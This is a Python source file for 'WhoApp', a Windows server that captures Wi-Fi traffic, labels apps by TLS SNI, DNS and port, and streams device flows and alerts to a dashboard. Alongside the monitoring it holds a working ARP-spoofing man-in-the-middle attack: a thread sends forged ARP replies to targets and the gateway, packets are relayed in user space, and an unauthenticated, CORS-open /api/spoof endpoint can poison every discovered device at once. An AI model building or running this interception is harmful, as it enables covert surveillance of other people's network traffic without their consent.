"""
WhoApp — Native Windows Live Capture Server
Captures from Wi-Fi using Npcap/Scapy, classifies traffic, streams to browser via WebSocket.
No Docker or Redis required. Run as Administrator.

Usage:
    python live_server.py [--iface "Wi-Fi"] [--ws-port 8765] [--http-port 8766]
"""
import os, sys, json, time, hashlib, re, argparse, threading, asyncio, logging
from collections import defaultdict
from datetime import datetime, timezone
from pathlib import Path
import ipaddress

def is_local_ip(ip_str: str) -> bool:
    try:
        ip = ipaddress.IPv4Address(ip_str)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return True
        # Treat 30.x.x.x as local for this specific network setup
        if ip_str.startswith("30."):
            return True
        return False
    except Exception:
        return False

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("whoapp")

# ── State shared between capture thread and WS coroutines ──────────────────────
_state_lock = threading.Lock()
_devices: dict  = {}   # ip → device dict
_alerts: list   = []   # last 500 alerts
_flows: list    = []   # last 2000 flows
_ws_clients: set = set()
_hostnames: dict = {}  # ip -> hostname
_loop: asyncio.AbstractEventLoop = None
_spoofed_ips: set = set()
_gateway_ip = None
_gateway_mac = None

# ── App signature DB (SNI / DNS heuristics) ────────────────────────────────────
SNI_RULES = [
    (re.compile(r"(googlevideo|youtube\.com|ytimg)"),     "YouTube",        "streaming",   2),
    (re.compile(r"netflix\.com|nflxvideo"),               "Netflix",        "streaming",   2),
    (re.compile(r"spotify\.com|scdn\.co"),                "Spotify",        "streaming",   1),
    (re.compile(r"(whatsapp\.net|whatsapp\.com)"),        "WhatsApp",       "messaging",   1),
    (re.compile(r"telegram\.(org|me|api)"),               "Telegram",       "messaging",   1),
    (re.compile(r"discord(app)?\.com|discord\.gg"),       "Discord",        "messaging",   2),
    (re.compile(r"(zoom\.us|zoomus\.com)"),               "Zoom",           "video_conf",  2),
    (re.compile(r"teams\.microsoft\.com|teams\.live"),    "MS Teams",       "video_conf",  2),
    (re.compile(r"meet\.google\.com"),                    "Google Meet",    "video_conf",  2),
    (re.compile(r"(facebook|fbcdn|fb\.com)"),             "Facebook",       "social_media",2),
    (re.compile(r"instagram\.com|cdninstagram"),          "Instagram",      "social_media",2),
    (re.compile(r"twitter\.com|t\.co|twimg"),             "Twitter/X",      "social_media",2),
    (re.compile(r"tiktok(v\.com|cdn|\.com)"),             "TikTok",         "social_media",3),
    (re.compile(r"(dropbox|dropboxapi)\.com"),            "Dropbox",        "cloud_storage",2),
    (re.compile(r"(drive|docs|sheets)\.google\.com"),     "Google Drive",   "cloud_storage",1),
    (re.compile(r"onedrive\.live\.com|1drv\.ms"),         "OneDrive",       "cloud_storage",1),
    (re.compile(r"(torrent|bittorrent|bt\.)"),            "BitTorrent",     "torrent",     7),
    (re.compile(r"(nordvpn|expressvpn|protonvpn|mullvad)"), "VPN",          "vpn",         5),
    (re.compile(r"\.onion$|torproject\.org"),             "Tor",            "dark_web",    9),
    (re.compile(r"(gmail|mail\.google|smtp\.google)"),    "Gmail",          "email",       1),
    (re.compile(r"outlook\.com|office365|live\.com"),     "Outlook",        "email",       1),
    (re.compile(r"(amazonaws|s3\.|cloudfront)"),          "AWS",            "cloud_infra", 2),
    (re.compile(r"(azure|microsoft|msftconnect)"),        "Microsoft",      "cloud_infra", 1),
    (re.compile(r"(google\.com|gstatic|googleapis)"),     "Google",         "browser",     1),
    (re.compile(r"(github|githubusercontent)\.com"),      "GitHub",         "dev_tool",    1),
    (re.compile(r"(steamcommunity|steampowered|akamai)"), "Steam",          "gaming",      2),
    (re.compile(r"(epicgames|fortnite)"),                 "Epic Games",     "gaming",      2),
]

PORT_RULES = {
    80:   ("HTTP",    "browser",      1),
    443:  ("HTTPS",   "browser",      1),
    22:   ("SSH",     "remote_access",5),
    23:   ("Telnet",  "remote_access",8),
    3389: ("RDP",     "remote_access",6),
    25:   ("SMTP",    "email",        3),
    110:  ("POP3",    "email",        2),
    143:  ("IMAP",    "email",        2),
    53:   ("DNS",     "dns",          1),
    67:   ("DHCP",    "network",      1),
    68:   ("DHCP",    "network",      1),
    6881: ("BitTorrent","torrent",    7),
    4444: ("Metasploit","exploit_tool",10),
    1194: ("OpenVPN", "vpn",          5),
    1723: ("PPTP VPN","vpn",          5),
}

def classify(sni: str, dns: str, dst_port: int):
    host = sni or dns or ""
    for pattern, app, cat, risk in SNI_RULES:
        if pattern.search(host):
            return app, cat, risk
    if dst_port in PORT_RULES:
        app, cat, risk = PORT_RULES[dst_port]
        return app, cat, risk
    return "Unknown", "unknown", 1

# ── MAC OUI mini-DB ────────────────────────────────────────────────────────────
OUI_DB = {
    "D2:37:26": "Intel (local)",
    "00:50:56": "VMware",
    "08:00:27": "VirtualBox",
    "B8:27:EB": "Raspberry Pi",
    "DC:A6:32": "Raspberry Pi",
    "00:0C:29": "VMware",
    "F4:5C:89": "Apple",
    "3C:22:FB": "Apple",
    "A4:CF:99": "Apple",
    "00:11:22": "Cisco",
}

def oui_vendor(mac: str) -> str:
    if not mac:
        return "Unknown"
    prefix = mac.upper()[:8]
    return OUI_DB.get(prefix, "Unknown")

def guess_device_info(hostname: str, vendor: str):
    h = (hostname or "").lower()
    v = (vendor or "").lower()
    
    device_type = "laptop"
    friendly_name = "Laptop"
    
    if "android" in h:
        device_type = "phone"
        friendly_name = "Android"
    elif "iphone" in h:
        device_type = "phone"
        friendly_name = "iPhone"
    elif "ipad" in h:
        device_type = "phone"
        friendly_name = "iPad"
    elif "macbook" in h or "imac" in h or "macmini" in h:
        device_type = "laptop"
        friendly_name = "Mac"
    elif "desktop" in h:
        device_type = "laptop"
        friendly_name = "Desktop PC"
    elif "raspberry" in v:
        device_type = "iot"
        friendly_name = "Raspberry Pi"
    elif "apple" in v:
        device_type = "phone"
        friendly_name = "Apple Device"
    elif "vmware" in v or "virtualbox" in v:
        device_type = "server"
        friendly_name = "Virtual Machine"
        
    return device_type, friendly_name

# ── TLS SNI extractor ──────────────────────────────────────────────────────────
def extract_sni(payload: bytes) -> str:
    try:
        if len(payload) < 5 or payload[0] != 0x16:
            return ""
        pos = 5
        if payload[pos] != 0x01:
            return ""
        pos += 4
        pos += 2 + 32  # version + random
        session_len = payload[pos]; pos += 1 + session_len
        cipher_len = int.from_bytes(payload[pos:pos+2], 'big'); pos += 2 + cipher_len
        comp_len = payload[pos]; pos += 1 + comp_len
        ext_total = int.from_bytes(payload[pos:pos+2], 'big'); pos += 2
        end = pos + ext_total
        while pos < end - 4:
            ext_type = int.from_bytes(payload[pos:pos+2], 'big')
            ext_len  = int.from_bytes(payload[pos+2:pos+4], 'big')
            pos += 4
            if ext_type == 0:  # SNI
                pos += 3  # list len + type
                name_len = int.from_bytes(payload[pos:pos+2], 'big'); pos += 2
                return payload[pos:pos+name_len].decode('utf-8', errors='ignore')
            pos += ext_len
    except Exception:
        pass
    return ""

# ── Scapy capture ──────────────────────────────────────────────────────────────
def _make_flow(src_ip, dst_ip, src_port, dst_port, proto, sni, dns, pkt_len, mac):
    app_name, app_cat, risk = classify(sni, dns, dst_port)
    ts = datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z')
    vendor = oui_vendor(mac)
    
    hostname = _hostnames.get(src_ip, src_ip)
    dtype, friendly_name = guess_device_info(hostname, vendor)
    
    flow = {
        "ts": ts,
        "src_ip":   src_ip,
        "dst_ip":   dst_ip,
        "src_port": src_port,
        "dst_port": dst_port,
        "protocol": proto,
        "sni":      sni,
        "dns":      dns,
        "byte_count": pkt_len,
        "src_mac":  mac,
        "identity": {
            "ip":           src_ip,
            "mac":          mac,
            "hostname":     hostname,
            "user":         friendly_name,
            "device_type":  dtype,
            "manufacturer": vendor,
        },
        "app": {
            "app_name":     app_name,
            "app_category": app_cat,
            "app_risk_score": risk,
        },
    }
    return flow

def _push_flow(flow):
    global _flows, _devices, _alerts
    with _state_lock:
        _flows = [flow] + _flows[:1999]
        ip = flow["src_ip"]
        _devices[ip] = flow

        # Simple alert rules
        risk = flow["app"]["app_risk_score"]
        cat  = flow["app"]["app_category"]
        alerts_to_add = []

        if cat == "dark_web":
            alerts_to_add.append(("Tor/Dark Web Access", "Critical", ["dark-web", "policy-violation"]))
        elif cat == "torrent":
            alerts_to_add.append(("BitTorrent Detected", "High", ["torrent", "policy-violation"]))
        elif cat == "vpn":
            alerts_to_add.append(("VPN Traffic", "Medium", ["vpn"]))
        elif cat == "exploit_tool":
            alerts_to_add.append(("Exploit Tool Traffic", "Critical", ["exploit", "threat"]))
        elif risk >= 8 and cat not in ("dark_web", "torrent", "exploit_tool"):
            alerts_to_add.append((f"High-Risk Traffic: {flow['app']['app_name']}", "High", ["high-risk"]))

        for name, sev, tags in alerts_to_add:
            alert = {
                "ts": flow["ts"],
                "rule_name": name,
                "severity": sev,
                "tags": tags,
                "src_ip": ip,
                "app": flow["app"]["app_name"],
                "dst_ip": flow["dst_ip"],
                "sni": flow.get("sni", ""),
            }
            _alerts = [alert] + _alerts[:499]

    # Broadcast to WS clients
    if _loop:
        msg_flow  = json.dumps({"channel": "flows:live", "data": flow})
        for alert in alerts_to_add:
            alert_obj = {
                "ts": flow["ts"], "rule_name": alert[0], "severity": alert[1],
                "tags": alert[2], "src_ip": ip, "app": flow["app"]["app_name"],
                "dst_ip": flow["dst_ip"], "sni": flow.get("sni", ""),
            }
            msg_alert = json.dumps({"channel": "alerts", "data": alert_obj})
            asyncio.run_coroutine_threadsafe(_broadcast(msg_alert), _loop)
        asyncio.run_coroutine_threadsafe(_broadcast(msg_flow), _loop)


def _capture_thread(iface: str):
    """Runs Scapy sniff in a background thread."""
    try:
        from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw, get_if_addr, get_if_hwaddr, sendp, getmacbyip
        from scapy.layers.dhcp import DHCP, BOOTP
    except ImportError:
        log.error("Scapy not installed. Run: pip install scapy")
        return

    log.info(f"[Capture] Sniffing on '{iface}' (Npcap) …")

    try:
        my_ip = get_if_addr(iface)
        my_mac = get_if_hwaddr(iface)
    except Exception:
        my_ip = None
        my_mac = None

    def _safe_decode(b) -> str:
        if isinstance(b, bytes):
            return b.decode("utf-8", errors="replace").rstrip(".")
        return str(b).rstrip(".")

    def process(pkt):
        try:
            # --- Identity Extraction (DHCP / mDNS) ---
            if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP):
                opts = pkt[DHCP].options
                msg_type = next((opt[1] for opt in opts if isinstance(opt, tuple) and opt[0] == "message-type"), None)
                if msg_type in (2, 5):  # OFFER or ACK
                    client_ip = str(pkt[BOOTP].yiaddr)
                    hostname = next((opt[1] for opt in opts if isinstance(opt, tuple) and opt[0] == "hostname"), None)
                    if hostname:
                        _hostnames[client_ip] = _safe_decode(hostname)
            
            if pkt.haslayer(DNS):
                dns_layer = pkt[DNS]
                src_ip = pkt[IP].src if pkt.haslayer(IP) else None
                if dns_layer.qr == 1 and dns_layer.an:  # Response
                    answers = dns_layer.an
                    while answers:
                        if answers.type == 1:  # A record
                            _hostnames[answers.rdata] = _safe_decode(answers.rrname)
                        elif answers.type == 12 and src_ip:  # PTR
                            _hostnames[src_ip] = _safe_decode(answers.rdata)
                        try:
                            answers = answers.payload
                        except Exception:
                            break

            # --- Flow Extraction ---
            if not pkt.haslayer(IP):
                return
            ip   = pkt[IP]
            src, dst = ip.src, ip.dst
            proto = "TCP" if pkt.haslayer(TCP) else ("UDP" if pkt.haslayer(UDP) else "OTHER")
            sp = pkt[TCP].sport if pkt.haslayer(TCP) else (pkt[UDP].sport if pkt.haslayer(UDP) else 0)
            dp = pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else 0)
            pkt_len = len(pkt)

            src_mac = pkt.src if hasattr(pkt, 'src') else ""
            dst_mac = pkt.dst if hasattr(pkt, 'dst') else ""

            # Prevent double-counting: ignore packets we are manually forwarding
            if my_mac and src_mac == my_mac and src != my_ip:
                return

            # --- User-Space Packet Forwarding ---
            # If Windows IP Routing is disabled/broken, we manually forward intercepted packets
            if my_mac and dst_mac == my_mac and dst != my_ip:
                if not (dst == "255.255.255.255" or dst.startswith("224.") or dst.startswith("239.") or dst.endswith(".255")):
                    is_spoofed_src = src in _spoofed_ips
                    if is_spoofed_src and _gateway_mac:
                        fwd = pkt.copy()
                        fwd.dst = _gateway_mac
                        fwd.src = my_mac
                        sendp(fwd, iface=iface, verbose=False)
                    elif dst in _spoofed_ips:
                        t_mac = getmacbyip(dst)
                        if t_mac:
                            fwd = pkt.copy()
                            fwd.dst = t_mac
                            fwd.src = my_mac
                            sendp(fwd, iface=iface, verbose=False)

            sni = ""
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                sni = extract_sni(bytes(pkt[Raw]))

            dns_query = ""
            if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
                dns_query = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')

            # Skip noisy internal-only traffic (DHCP/ARP etc.)
            if dp in (67, 68) or sp in (67, 68):
                return

            # Normalize direction so local device is always client (src)
            if not is_local_ip(src) and is_local_ip(dst):
                # Inbound: from remote server to local client
                client_ip, server_ip = dst, src
                client_port, server_port = dp, sp
                mac = dst_mac
            else:
                # Outbound or Local-to-Local: src is client
                client_ip, server_ip = src, dst
                client_port, server_port = sp, dp
                mac = src_mac

            flow = _make_flow(client_ip, server_ip, client_port, server_port, proto, sni, dns_query, pkt_len, mac)
            _push_flow(flow)
        except Exception as e:
            pass

    sniff(iface=iface, prn=process, store=False)


# ── WebSocket server ───────────────────────────────────────────────────────────
async def _broadcast(msg: str):
    dead = set()
    for ws in list(_ws_clients):
        try:
            await ws.send(msg)
        except Exception:
            dead.add(ws)
    _ws_clients.difference_update(dead)


async def _ws_handler(websocket):
    _ws_clients.add(websocket)
    log.info(f"[WS] Client connected ({len(_ws_clients)} total)")
    # Send initial state
    with _state_lock:
        init = {"channel": "init", "data": {
            "recent_alerts": _alerts[:50],
            "devices": list(_devices.values()),
            "spoofed_ips": list(_spoofed_ips),
        }}
    await websocket.send(json.dumps(init))
    try:
        async for _ in websocket:
            pass
    except Exception:
        pass
    finally:
        _ws_clients.discard(websocket)
        log.info(f"[WS] Client disconnected")


# ── HTTP server for CORS API ───────────────────────────────────────────────────
async def _http_handler(request):
    from aiohttp import web
    
    if request.method == "OPTIONS":
        return web.Response(headers={
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        })
        
    if request.path == "/api/devices":
        with _state_lock:
            data = list(_devices.values())
        return web.json_response(data, headers={"Access-Control-Allow-Origin": "*"})
        
    if request.path == "/api/alerts":
        with _state_lock:
            data = _alerts[:100]
        return web.json_response(data, headers={"Access-Control-Allow-Origin": "*"})
        
    if request.path == "/api/spoof" and request.method == "POST":
        try:
            data = await request.json()
            ip = data.get("ip")
            action = data.get("action")
            
            with _state_lock:
                if action == "start":
                    if not _spoofed_ips:
                        os.system('powershell -Command "Set-NetIPInterface -Forwarding Enabled"')
                    _spoofed_ips.add(ip)
                elif action == "stop":
                    _spoofed_ips.discard(ip)
                elif action == "start_all":
                    if not _spoofed_ips:
                        os.system('powershell -Command "Set-NetIPInterface -Forwarding Enabled"')
                    for dev_ip in _devices.keys():
                        if dev_ip != _gateway_ip:
                            _spoofed_ips.add(dev_ip)
                elif action == "stop_all":
                    _spoofed_ips.clear()
                    
                current_spoofed = list(_spoofed_ips)
                
            if _loop:
                msg = json.dumps({"channel": "spoof_state", "data": current_spoofed})
                asyncio.run_coroutine_threadsafe(_broadcast(msg), _loop)
                
            return web.json_response({"status": "ok", "spoofed": current_spoofed}, headers={"Access-Control-Allow-Origin": "*"})
        except Exception as e:
            return web.json_response({"error": str(e)}, status=500, headers={"Access-Control-Allow-Origin": "*"})

    return web.json_response({"status": "ok"}, headers={"Access-Control-Allow-Origin": "*"})


async def _run_http(port: int):
    from aiohttp import web
    app = web.Application()
    app.router.add_route("*", "/api/devices", _http_handler)
    app.router.add_route("*", "/api/alerts",  _http_handler)
    app.router.add_route("*", "/api/spoof",   _http_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"[HTTP] API listening on :{port}")


async def _run_ws(port: int):
    import websockets
    async with websockets.serve(_ws_handler, "0.0.0.0", port):
        log.info(f"[WS] WebSocket listening on :{port}")
        await asyncio.get_event_loop().create_future()  # run forever


async def _main_async(ws_port: int, http_port: int):
    await asyncio.gather(
        _run_ws(ws_port),
        _run_http(http_port),
    )


# ── Entry point ────────────────────────────────────────────────────────────────
def _spoofer_thread(iface: str):
    from scapy.all import ARP, send, conf, srp, Ether, getmacbyip
    global _gateway_ip, _gateway_mac
    
    def get_mac(ip):
        mac = getmacbyip(ip)
        if mac: return mac
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=iface, timeout=2, verbose=False)
        if ans:
            return ans[0][1].src
        return None

    try:
        _gateway_ip = conf.route.route("0.0.0.0")[2]
        _gateway_mac = get_mac(_gateway_ip)
    except Exception as e:
        log.error(f"Spoofer init failed: {e}")
        return

    log.info(f"[Spoofer] Ready. Auto-detected Gateway: {_gateway_ip} ({_gateway_mac})")
    
    target_mac_cache = {}
    
    while True:
        with _state_lock:
            targets = list(_spoofed_ips)
            
        if not targets or not _gateway_mac:
            time.sleep(1)
            continue
            
        for t_ip in targets:
            try:
                t_mac = target_mac_cache.get(t_ip)
                if not t_mac:
                    t_mac = get_mac(t_ip)
                    if t_mac:
                        target_mac_cache[t_ip] = t_mac
                        
                if t_mac:
                    send(ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=_gateway_ip), iface=iface, verbose=False)
                    send(ARP(op=2, pdst=_gateway_ip, hwdst=_gateway_mac, psrc=t_ip), iface=iface, verbose=False)
            except Exception:
                pass
        time.sleep(2)

def main():
    global _loop

    parser = argparse.ArgumentParser(description="WhoApp Live Capture Server")
    parser.add_argument("--iface",     default="Wi-Fi",  help="Network interface name (default: Wi-Fi)")
    parser.add_argument("--ws-port",   type=int, default=8765)
    parser.add_argument("--http-port", type=int, default=8766)
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("  WhoApp Live Capture Server — Native Windows Mode")
    log.info(f"  Interface : {args.iface}")
    log.info(f"  WebSocket : ws://localhost:{args.ws_port}")
    log.info(f"  HTTP API  : http://localhost:{args.http_port}")
    log.info(f"  Dashboard : http://localhost:3000")
    log.info("=" * 60)

    # Start capture in background thread
    cap_thread = threading.Thread(
        target=_capture_thread, args=(args.iface,), daemon=True
    )
    cap_thread.start()
    
    # Start ARP spoofer thread
    spoof_thread = threading.Thread(target=_spoofer_thread, args=(args.iface,), daemon=True)
    spoof_thread.start()

    # Run async WS + HTTP servers
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)
    try:
        _loop.run_until_complete(_main_async(args.ws_port, args.http_port))
    except KeyboardInterrupt:
        log.info("Shutting down.")


if __name__ == "__main__":
    main()
